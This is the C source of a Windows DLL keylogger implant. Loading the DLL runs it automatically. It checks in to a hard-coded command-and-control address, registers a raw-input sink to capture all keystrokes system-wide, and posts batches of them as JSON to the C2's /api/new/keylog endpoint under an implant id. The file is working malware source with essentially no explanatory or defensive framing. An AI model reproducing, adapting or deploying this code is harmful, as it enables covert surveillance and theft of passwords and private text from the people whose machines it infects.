#include "httpclient.h"
#include "process.h"
#include "vk_names.h"
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <windows.h>

#ifndef QWORD
typedef unsigned __int64 QWORD;
#endif

/* wchar_t *C2_IP = L"192.168.4.163"; */
wchar_t *C2_IP = L"10.0.0.98";

int ABORT = 0;

int MAX_CACHED_KEYPRESSES = 50;
int KEYPRESS_LOG_MAX_SIZE = 100;

char *cached_keypresses;
int cached_keypresses_amt = 0;
int implant_id = 0;

char *process_kbd_event(int vsc, int e0, int e1, int keyup, int vk) {
  /* klg_ctx_t ctx = get_context(); */

  /* fprintf(stdout, */
  /*         "{ \"time\": %d, \"klid\": \"%s\", \"keyup\": %d, \"sc\": %d, " */
  /*         "\"e0\": %d, \"e1\": %d, \"vk\": %d, \"vkn\": \"%s\" }\n", */
  /*         ctx.time, ctx.klid, keyup ? 1 : 0, vsc, e0 ? 1 : 0, e1 ? 1 : 0, vk,
   */
  /*         VKN(vk)); */
  char *buf = (char *)malloc(sizeof(char) * KEYPRESS_LOG_MAX_SIZE);
  /* printf("%d\n", keyup); */
  /* printf("%d\n", vk); */
  /* sprintf(buf, "\n{\"keyup\": %d,\"vk\": %d, \"vkn\": \"%s\"}", keyup ? 1 :
   * 0, */
  /*         vk, VKN(vk)); */

  sprintf(buf,
          "\n{\"keyup\": %d, \"sc\": %d, \"e0\": %d, \"e1\": "
          "%d, \"vk\": %d, \"vkn\": \"%s\"}",
          keyup ? 1 : 0, vsc, e0 ? 1 : 0, e1 ? 1 : 0, vk, VKN(vk));
  return buf;
}

int hkl_to_klid(HKL hkl, char out_klid[KL_NAMELENGTH]) {
  memset(out_klid, 0, KL_NAMELENGTH);

  WORD device = HIWORD(hkl);

  if ((device & 0xf000) == 0xf000) // `Device Handle` contains `Layout ID`
  {
    WORD layoutId = device & 0x0fff;

    HKEY key;
    if (RegOpenKeyA(HKEY_LOCAL_MACHINE,
                    "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts",
                    &key) != ERROR_SUCCESS)
      return -1;

    DWORD index = 0;
    char buffer[KL_NAMELENGTH];
    DWORD len = sizeof(buffer);

    while (RegEnumKeyExA(key, index, buffer, &len, NULL, NULL, NULL, NULL) ==
           ERROR_SUCCESS) {
      char layoutIdBuffer[MAX_PATH] = {};
      DWORD layoutIdBufferSize = sizeof(layoutIdBuffer);
      if (RegGetValueA(key, buffer, "Layout Id", RRF_RT_REG_SZ, NULL,
                       layoutIdBuffer, &layoutIdBufferSize) == ERROR_SUCCESS) {
        if (layoutId == strtoul(layoutIdBuffer, NULL, 16)) {
          _strupr(buffer);
          strncpy(out_klid, buffer, KL_NAMELENGTH);
          return 0;
        }
      }
      len = (DWORD)sizeof(buffer);
      ++index;
    }

    RegCloseKey(key);
  } else {
    if (device == 0) {
      device = LOWORD(hkl);
    }

    snprintf(out_klid, KL_NAMELENGTH, "%08X", device);
    return 0;
  }

  return -1;
}

void cacheKeypress(char *buf) {
  strcat(cached_keypresses, buf);
  cached_keypresses_amt += 1;
  if (cached_keypresses_amt > MAX_CACHED_KEYPRESSES) {
    DWORD stOut = 0;
    char id_str[KEYPRESS_LOG_MAX_SIZE];
    sprintf(id_str, "{\"id\": %d}", implant_id);
    /* int seen_end_curly = 0; */
    /* for (int i = 0; i < 15; i++) { */
    /*   if (seen_end_curly == 1) { */
    /*     id_str[i] = '\0'; */
    /*   } else if (id_str[i] == '}') { */
    /*     seen_end_curly = 1; */
    /*   } */
    /* } */
    size_t total_len = strlen(cached_keypresses) + strlen(id_str) + 1;
    char *cached_keypresses_plus_implantid =
        (char *)calloc(total_len, sizeof(char));
    strcpy(cached_keypresses_plus_implantid, id_str);
    strcat(cached_keypresses_plus_implantid, cached_keypresses);
    LPBYTE result = HTTPRequest(
        L"POST", C2_IP, L"/api/new/keylog", 5000, L"sup",
        (LPBYTE)cached_keypresses_plus_implantid,
        strlen(cached_keypresses_plus_implantid), &stOut, 0, NULL, 0);
    free(result);
    free(cached_keypresses_plus_implantid);
    memset(cached_keypresses, 0, MAX_CACHED_KEYPRESSES * KEYPRESS_LOG_MAX_SIZE);
    cached_keypresses[0] = '\0';
    cached_keypresses_amt = 0;
    printf("Sent %d keypresses to C2\n", MAX_CACHED_KEYPRESSES);
  }
}

// to receive events for the rawkeyboard data
LRESULT CALLBACK wndproc(HWND window, UINT message, WPARAM wparam,
                         LPARAM lparam) {
  switch (message) {
  case WM_DESTROY:
    return 0;
  case WM_INPUT:
    char rid_buf[64];
    UINT rid_size = sizeof(rid_buf);

    if (GetRawInputData((HRAWINPUT)lparam, RID_INPUT, rid_buf, &rid_size,
                        sizeof(RAWINPUTHEADER))) {
      RAWINPUT *raw = (RAWINPUT *)rid_buf;
      if (raw->header.dwType == RIM_TYPEKEYBOARD) {
        RAWKEYBOARD *rk = &raw->data.keyboard;
        char *buf = process_kbd_event(rk->MakeCode, rk->Flags & RI_KEY_E0,
                                      rk->Flags & RI_KEY_E1,
                                      rk->Flags & RI_KEY_BREAK, rk->VKey);
        cacheKeypress(buf);
        free(buf);
      }
    }
    break;
  }
  return DefWindowProc(window, message, wparam, lparam);
}

void sig_handler(int signal) {
  fprintf(stderr, "> exiting..\n");
  free(cached_keypresses);
  if (signal == SIGABRT || signal == SIGINT)
    ABORT = 1;
}

__declspec(dllexport) int mainLog() {
  cached_keypresses =
      (char *)malloc(MAX_CACHED_KEYPRESSES * KEYPRESS_LOG_MAX_SIZE);
  memset(cached_keypresses, 0, MAX_CACHED_KEYPRESSES * KEYPRESS_LOG_MAX_SIZE);

  fprintf(stderr, "> checking in to c2...\n");
  DWORD stOut = 0;
  // request type, server, uri, port, UA, useless other stuff
  LPBYTE id = HTTPRequest(L"GET", C2_IP, L"/api/new/implant", 5000, L"sup",
                          NULL, 0, &stOut, 0, NULL, 0);
  char *json = (char *)id;
  char *first_end_curly = strchr(json, '}');

  if (first_end_curly != NULL) {
    size_t len = first_end_curly - (char *)json;

    char result[len + 1];
    strncpy(result, json, len);
    result[len] = '\0';

    char *colon_loc = strchr(result, ':');

    if (colon_loc != NULL) {
      char *int_str = colon_loc + 1;
      implant_id = atoi(int_str);
      printf("%d\n", implant_id);
    }
  }

  // define a window class which is required to receive RAWINPUT events
  WNDCLASSEX wc;
  ZeroMemory(&wc, sizeof(WNDCLASSEX));
  wc.cbSize = sizeof(WNDCLASSEX);
  wc.lpfnWndProc = wndproc;
  wc.hInstance = GetModuleHandle(NULL);
  wc.lpszClassName = "rawkbd_wndclass";

  // register class
  if (!RegisterClassExA(&wc))
    return -1;

  // create window
  HWND rawkbd_wnd =
      CreateWindowExA(0, wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE,
                      NULL, GetModuleHandle(NULL), NULL);
  if (!rawkbd_wnd)
    return -2;

  // setup raw input device sink
  RAWINPUTDEVICE devs = {0x01 /* generic */, 0x06 /* keyboard */,
                         RIDEV_INPUTSINK, rawkbd_wnd};
  if (RegisterRawInputDevices(&devs, 1, sizeof(RAWINPUTDEVICE)) == FALSE)
    return -3;

  // loop until ctrl+c
  signal(SIGINT, sig_handler);
  MSG msg;
  while (!ABORT && GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  // some cleanup
  DestroyWindow(rawkbd_wnd);
  UnregisterClass("rawkbd_wndclass", GetModuleHandle(NULL));
  return 0;
}

// Entrypoint for the DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  switch (fdwReason) {
  case DLL_PROCESS_ATTACH:
    // Code to run when the DLL is loaded
    mainLog();
    break;
  case DLL_PROCESS_DETACH:
    // Code to run when the DLL is unloaded
    break;
  case DLL_THREAD_ATTACH:
    // Code to run when a thread is created during DLL's existence
    break;
  case DLL_THREAD_DETACH:
    // Code to run when a thread ends normally
    break;
  }
  return TRUE; // Successful
}
